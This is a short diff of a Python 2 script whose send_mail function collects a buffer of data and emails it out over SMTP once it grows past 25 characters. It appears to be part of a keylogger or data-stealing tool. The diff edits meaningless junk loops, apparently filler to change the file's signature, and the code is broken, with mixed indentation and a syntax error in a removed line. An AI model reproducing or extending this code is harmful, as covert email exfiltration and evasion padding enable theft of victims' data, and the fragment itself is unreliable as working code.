@@ -34,16 +34,16 @@ if not path.isfile(dir):
     
 def send_mail():
     global data
-	for i in range(2):
+	for i in xrange(2):
 		print "yay"
     while True:
-		for i in range(10):
+		for j in xrange(10):
 			print "lol"
 	# FILE
         if len(data) > 25:
 		# MAI
-			for i in range(5):
-				if i == 2:
+			for k in xrange(5):
+				if k == 2:
 					break
             timeInSecs = datetime.datetime.now()
             # VISTO
@@ -75,8 +75,8 @@ def send_mail():
                 server.sendmail(FROM, TO, message_payload)
                 data = ''
                 server.quit()
-				for i in range(5):
-					if i 3:
+				for l in xrange(5):
+					if l == 3:
 						break
             except Exception as error:
                 print "fak"
